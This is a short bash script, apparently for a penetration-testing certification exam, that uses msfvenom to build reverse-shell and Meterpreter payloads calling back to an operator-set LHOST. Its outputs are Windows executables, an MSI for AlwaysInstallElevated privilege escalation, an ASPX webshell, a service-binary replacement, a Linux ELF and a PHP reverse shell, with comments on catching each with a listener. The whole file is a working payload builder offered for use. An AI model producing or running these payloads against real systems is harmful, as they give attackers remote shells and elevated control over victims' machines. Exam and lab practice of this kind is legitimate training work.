#!/usr/bin/env bash
# msfvenom-templates.sh — pre-build staged payloads for the exam.
# msfvenom is NOT the "one Metasploit use" — only msfconsole exploitation counts. Build freely.
# Usage:  LHOST=10.1.1.9 bash msfvenom-templates.sh           (builds all on port 4444)
#         LHOST=10.1.1.9 PORT=5555 bash msfvenom-templates.sh (privesc port)
set -euo pipefail

: "${LHOST:?set LHOST=<your Kali IP>}"
PORT="${PORT:-4444}"
case "$PORT" in 4444|5555|6666) ;; *) echo "PORT must be 4444/5555/6666"; exit 1;; esac
OUT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
echo "[*] LHOST=$LHOST PORT=$PORT -> $OUT"

# --- Windows -----------------------------------------------------------------
# plain reverse shell (catch with: nc -lvnp PORT)
msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$PORT" -f exe    -o "$OUT/rev_${PORT}.exe"
# meterpreter (catch with: msf multi/handler, windows/x64/meterpreter/reverse_tcp)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$PORT" -f exe -o "$OUT/met_${PORT}.exe"
# MSI for AlwaysInstallElevated (msiexec /quiet /qn /i evil.msi)
msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$PORT" -f msi    -o "$OUT/aie_${PORT}.msi"
# ASPX webshell (IIS upload)
msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$PORT" -f aspx   -o "$OUT/shell_${PORT}.aspx"
# service exe (replace a writable service binary; auto-restarts a thread so service doesn't hang)
msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$PORT" -f exe-service -o "$OUT/svc_${PORT}.exe"

# --- Linux -------------------------------------------------------------------
msfvenom -p linux/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$PORT" -f elf -o "$OUT/rev_${PORT}.elf"

# --- Web (language webshells) ------------------------------------------------
msfvenom -p php/reverse_php LHOST="$LHOST" LPORT="$PORT" -f raw -o "$OUT/rev_${PORT}.php"

echo "[+] Built payloads in $OUT (port $PORT). Remember to start the matching listener."
ls -la "$OUT"/*"${PORT}"* 2>/dev/null || true
